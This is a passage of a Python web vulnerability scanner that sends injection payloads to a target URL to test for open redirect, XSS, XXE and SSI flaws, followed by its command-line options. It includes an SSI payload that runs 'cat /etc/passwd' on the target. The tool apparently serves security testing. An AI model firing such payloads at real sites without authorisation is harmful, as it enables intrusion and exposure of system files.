        time.sleep(2)
        invoke = requests.get(site, headers={"Content-type": "application/xml"}, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies)
        invoke1 = requests.get(site, headers={"Content-type": "text/xml"}, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies)
        
        if int(invoke.status_code) <= 400 or int(invoke1.status_code) <= 400:
            print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mServer might be accepting XML requests, XXE might come in clutch!\033[0;0m")
            time.sleep(2)
        else:
            print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "No vulnerability found for XXE")

            
def open_redirect():
    json_file = open('configs/openredirect_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))

        for parameter in params:
            if arg.verbose:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for {}".format(parameter, name))
            else:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
            if "https://google.com/" in requests.get(site + directory + "?" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).url:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mParameter {} might be vulnerable to {}\033[0;0m".format(parameter, name))
                print("Payload: {}".format(payload))
            else:
                pass
    
    json_file = open('configs/openredirect_xss_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))

        for parameter in params:
            if arg.verbose:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for {}".format(parameter, name))
            else:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
            if "javascript:alert(1)" in requests.get(site + directory + "?" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mParameter {} might be vulnerable to {}\033[0;0m".format(parameter, name))
                print("Payload: {}".format(payload))
            else:
                pass
 
def ssi_scan():
   def ssi():
       for parameters in params:
           if "root:" in requests.get(site + directory + "?" + parameters + '=<!--#exec cmd="cat /etc/passwd" -->', headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).url:
               print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mThe website is vulnerable to SSI injection\033[0;0m" )
           else:
               print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "The website isn't vulnerable to SSI injection")
   
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Checking the website for potential SSI before scanning")
   time.sleep(2)
   if ".shtml" in arg.full_site or ".stm" in arg.full_site or ".shtm " in arg.full_site:
       print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "\033[1mThe website appears to have a potential on SSI, begin scanning\033[0;0m")
       time.sleep(2)
       ssi()
       
   else:
       ssi_input = input("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Heuristic scan shows that website doesn't appear to have SSI injection. Do you still want to continue? [y/N]: ")
       if ssi_input == "Y" or ssi_input == "y":
           ssi()
       else:
           print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
           exit()
            
#first we define user's input with argument parsing
parser = argparse.ArgumentParser(description='Example : python3 WebForce.py -u "https://website.com/somewhere?id=" --all')
parser.add_argument('-u', '--url', action='store', dest='full_site', help='Target URL (e.g. "http://www.site.com/vuln.php?id=1")')#, required=True)
parser.add_argument('-a', '--all', action='store_true', dest='all_scan', help='Scan for every possible vulnerability')
parser.add_argument('--xss', help='Scan only for XSS', dest='xss_scan', action='store_true')
parser.add_argument('--ssti', help='Scan only for SSTI injection', dest='ssti_scan', action='store_true')
parser.add_argument('--ignore-ssl', help='Ignore SSL errors while scanning', dest='verify_cert', action='store_true')
parser.add_argument('--lfi', help='Scan only for LFI injection', dest='lfi_scan', action='store_true')
parser.add_argument('--sqli', help='Scan only for SQL injection', dest='sqli_scan', action='store_true')
parser.add_argument('--cors', help='Scan only for CORS vulnerability', dest='cors_scan', action='store_true')
parser.add_argument('--ssi', help='Scan only for SSI injection', dest='ssi_scan', action='store_true')
parser.add_argument('--crlf', help='Scan only for CRLF injection', dest='crlf_scan', action='store_true')
parser.add_argument('--xxe', help='Fast recon for XXE', dest='xxe_scan', action='store_true')
parser.add_argument('--open-redirect', help='Scan only for Open Redirect vulnerability', dest='open_redirect', action='store_true')
parser.add_argument('--parameter-pollution', help='Scan only for HTTP Parameter pollution vulnerabilities', dest='parameter_pollution', action='store_true')
parser.add_argument('--user-agent', help='Scan only for every possible User-Agent HTTP Header vulnerability', dest='user_agent', action='store_true')
parser.add_argument('--cookie-scan', help='Detect possible vulnerabilities by deciphering the cookie value', dest='cookie_scan', action='store_true')
parser.add_argument('--cipher', help='Detect possible vulnerabilities by deciphering the cookie value', dest='cipher_scan', action='store')
parser.add_argument('--proxy', help='Scan using proxy (e.g "127.0.0.1:8080")', dest='proxy_arg', action='store')
parser.add_argument('--redirect', help='Allow redirecting when sending request', dest='redirect', action='store_true')
parser.add_argument('--cookies', action='store', dest='cookies', help='Specify cookies (in JSON format)')
parser.add_argument('--no-param', help='Dont specify GET parameters on URL', dest='no_param', action='store_true')
parser.add_argument('--list', help='List all vulnerabilities that this scanner is able to do', action='store_true')
parser.add_argument('--verbose', help='Enable real-time scan information', dest='verbose', action='store_true')
parser.add_argument('--version', action='version', version='%(prog)s 1.0')
arg = parser.parse_args()


if arg.cipher_scan:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Preparing to decypher the cookie value")
   time.sleep(2)
   cipher_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()

if arg.cipher_scan is not True:
#extract domain, parameters and directory
    if arg.no_param is not True:
        from urllib.parse import urlparse
        parsed_uri = urlparse(arg.full_site)
        site = '{uri.scheme}://{uri.netloc}'.format(uri=parsed_uri)

        #extract the directory
        directory = urlparse(arg.full_site).path
    
        # important step, defines all the parameters from user's input
        query = requests.utils.urlparse(arg.full_site).query
        params = dict(x.split('=') for x in query.split('&'))
    else:
        site = arg.full_site

#before starting make sure the following rule is pleased
#make --all and other vuln scanning not possible together
if arg.all_scan and (arg.lfi_scan or arg.xss_scan or arg.ssti_scan or arg.cookie_scan or arg.user_agent or arg.sqli_scan or arg.crlf_scan or arg.cors_scan):
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "You cannot use --all with other vulnerabilities scanning such as --xss or --ssti and so on. Use them invidually if you want to scan a specific vulnerability.")
    exit()

#let the conditions begin
allow_redirects = False
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'}
verify = True

#cert verify is argument is present
if arg.verify_cert:
    verify = False

#get the cookie automatically before sending requests
if arg.cookies:
    cookies = arg.cookies
if arg.cookies is not True:
    session = requests.Session()
    response = session.get(arg.full_site)
    cookies = session.cookies.get_dict()

    if str(cookies) == "{}":
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "\033[1mNo cookie is detected, which means that the Cookie analysing part will be skipped or not working at all\033[0;0m")
        time.sleep(1)

    cookie_enable = input("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "The website seems to use custom cookies: {} \nDo you want to use those? [Y/n]: ".format(cookies))

    if cookie_enable == "Y" or cookie_enable == "y":
        pass

    if cookie_enable == "N" or cookie_enable == "n":
        cookies = input("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Enter your custom cookie(s) [In JSON format]: ")
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Preparing to start scanning using custom cookies...")

if arg.proxy_arg:
   if "http://" in arg.proxy_arg or "https://" in arg.proxy_arg:
       print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "Don't specify http:// in proxy argument")
   else:
       http_proxy = "http://" + str(arg.proxy_arg)
       https_proxy = "https://" + str(arg.proxy_arg)
       
       proxies = {
           "http": http_proxy,
           "https": https_proxy,
       }
       
if arg.proxy_arg is None:
    http_proxy = None
    https_proxy = None

    proxies = {
        "http": http_proxy,
        "https": https_proxy,
    }

if arg.redirect:
    allow_redirects = True

if arg.all_scan:
   arg.xss_scan = None
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Preparing to scan for every vulnerability")
   time.sleep(2)
   check_website()
   xss_scan()
   crlf_scan()
   ssti_scan()
   lfi_scan()
   cors_scan()
   sqli_scan()
   user_agent_scan()
   xxe_scan()
   #cookie_scan()
   open_redirect()
   parameter_pollution()
   ssi_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
   
if arg.xss_scan:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for only XSS")
   time.sleep(2)
   check_website()
   xss_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
   
if arg.ssti_scan:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for only SSTI injection")
   time.sleep(2)
   check_website()
   ssti_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
   
if arg.lfi_scan:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for only LFI injection")
   time.sleep(2)
   check_website()
   lfi_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
   
if arg.user_agent:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for testing User-Agent HTTP Header")
   time.sleep(2)
   check_website()
   user_agent_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
   
if arg.cookie_scan:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for Cookie(s)")
   time.sleep(2)
   check_website()
   cookie_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
   
if arg.sqli_scan:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for only SQL injection")
   time.sleep(2)
   sqli_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
   
if arg.crlf_scan:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for only CRLF injection")
   time.sleep(2)
   crlf_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()

if arg.xxe_scan:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for only XXE")
   time.sleep(2)
   check_website()
   xxe_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()

if arg.cors_scan:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for only CORS")
   time.sleep(2)
   cors_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
   
if arg.parameter_pollution:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for only HTTP Parameter Pollution")
   time.sleep(2)
   parameter_pollution()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
   
if arg.open_redirect:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for only Open redirect")
   time.sleep(2)
   open_redirect()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
   
if arg.ssi_scan:
   print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Launching a scan for only SSI injection")
   time.sleep(2)
   ssi_scan()
   print("[\033[92m+\033[0;0m] Finished scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")
   exit()
